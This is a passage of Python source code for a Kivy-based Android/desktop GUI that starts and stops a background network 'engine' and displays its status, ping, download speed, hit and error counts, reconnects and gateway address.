            log_btn.bind(on_press=lambda _: Engine.log_lines.clear())

            for b in (self._stop_btn, recon_btn, log_btn):
                act_row.add_widget(b)
            act_card.add_widget(act_row)
            root.add_widget(act_card)

            log_card = Card(bg="#0a0a18", radius=16,
                            orientation="vertical",
                            size_hint_y=None, height=dp(200),
                            padding=dp(10))
            log_card.add_widget(
                Label(text="LOG", font_size=sp(10), bold=True,
                      color=clr("#444466"), halign="left",
                      size_hint_y=None, height=dp(18)))
            log_sv = ScrollView(do_scroll_x=False, bar_width=dp(3))
            self._log_lbl = Label(
                text="", font_size=sp(9.5), color=clr("#666688"),
                halign="left", valign="top", size_hint_y=None, markup=False)
            self._log_lbl.bind(texture_size=self._log_lbl.setter("size"))
            log_sv.add_widget(self._log_lbl)
            log_card.add_widget(log_sv)
            root.add_widget(log_card)

            self._gw_lbl = Label(
                text="Gateway: scanning...", font_size=sp(9),
                color=clr("#2a2a5a"), size_hint_y=None, height=dp(20))
            root.add_widget(self._gw_lbl)

            Clock.schedule_once(self._auto_start, 0.5)
            Clock.schedule_interval(self._refresh, 1.0)
            return sv

        def _auto_start(self, *_):
            if not REQUESTS_OK:
                Engine.log("Missing: pip install requests urllib3")
                return
            Engine.mode      = "N"
            Engine.auto_mode = False
            threading.Thread(target=engine_start, daemon=True).start()
            Engine.log("Auto-start: engine launched")

        def _on_chip(self, btn):
            code = btn._code
            Engine.mode      = code
            Engine.auto_mode = code == "A"
            Engine.log(f"Mode: {btn.text}")
            self._highlight_chip(code)

        def _highlight_chip(self, active):
            for code, (chip, acc) in self._chips.items():
                if code == active:
                    chip.background_color = clr(acc)
                    chip.color            = clr("#0d0d1a")
                else:
                    chip.background_color = clr("#1a1a38")
                    chip.color            = clr(acc)

        def _on_stop(self, *_):
            if Engine.running:
                engine_stop()
                self._stop_btn.text             = "START"
                self._stop_btn.background_color = clr("#0a2a0a")
                self._stop_btn.color            = clr("#00e676")
                self._stop_btn.unbind(on_press=self._on_stop)
                self._stop_btn.bind(on_press=self._on_start)

        def _on_start(self, *_):
            if not Engine.running:
                threading.Thread(target=engine_start, daemon=True).start()
                self._stop_btn.text             = "STOP"
                self._stop_btn.background_color = clr("#2a0a0a")
                self._stop_btn.color            = clr("#ff5252")
                self._stop_btn.unbind(on_press=self._on_start)
                self._stop_btn.bind(on_press=self._on_stop)

        def _on_recon(self, *_):
            if Engine.running:
                Engine.log("Manual reconnect requested")
                _recon.request("manual reconnect")

        def _refresh(self, *_):
            try:
                if Engine._paused:
                    self._status_lbl.text  = "Reconnecting..."
                    self._status_lbl.color = clr("#ffd740")
                    self._dot.set_color("#ffd740")
                    self._pill.update("RECONNECTING", "#ffd740")
                elif Engine.running:
                    ql, _, _ = Engine.quality()
                    qc = ("#00e676" if ql in ("Excellent","Good")
                          else "#ffd740" if ql == "Fair" else "#ff5252")
                    self._status_lbl.text  = f"Connected  |  {ql}"
                    self._status_lbl.color = clr(qc)
                    self._dot.set_color(qc)
                    self._pill.update("ONLINE", "#00e676")
                else:
                    self._status_lbl.text  = "Stopped"
                    self._status_lbl.color = clr("#ff5252")
                    self._dot.set_color("#ff5252")
                    self._pill.update("OFFLINE", "#ff5252")

                self._uptime_lbl.text = Engine.uptime()

                p   = Engine.ema_ping
                bp  = Engine.best_ping
                pc  = ("#00e676" if p < 80 else "#ffd740" if p < 200 else "#ff5252")
                frac = max(0.0, 1.0 - p / 500.0)
                self._stat_bar.set(frac, pc)
                self._ping_lbl.text    = f"Ping: {p:.0f} ms"
                self._ping_lbl.color   = clr(pc)
                self._quality_lbl.text  = f"Best: {bp:.0f} ms"
                self._speed_lbl.text    = fmt_bytes(Engine.dl_speed) + "/s"

                total = Engine.hits + Engine.errs
                ec    = ("#00e676" if not total or Engine.errs/total < 0.1
                         else "#ffd740" if Engine.errs/total < 0.3 else "#ff5252")
                self._sc_hits.set(str(Engine.hits),   "#00e676")
                self._sc_errs.set(str(Engine.errs),   ec)
                self._sc_recon.set(str(Engine.reconnects), "#ffd740")
                self._sc_reauth.set(str(Engine.reauths),   "#40c4ff")

                gw = (f"{Engine.gateway_ip}:{Engine.gateway_port}"
                      if Engine.gateway_ip else "scanning...")
                self._gw_lbl.text = f"Gateway: {gw}   Threads: {Engine.active_threads}/{Engine.thread_count}"

                with Engine.lock:
                    lines = list(Engine.log_lines)
                self._log_lbl.text = "\n".join(lines[-20:])

            except Exception:
                pass

    TurboApp().run()


if __name__ == "__main__":
    if KIVY_AVAILABLE and "ANDROID_ARGUMENT" in os.environ:
        run_kivy()
    elif KIVY_AVAILABLE and "--gui" in sys.argv:
        run_kivy()
    else:
        run_terminal()
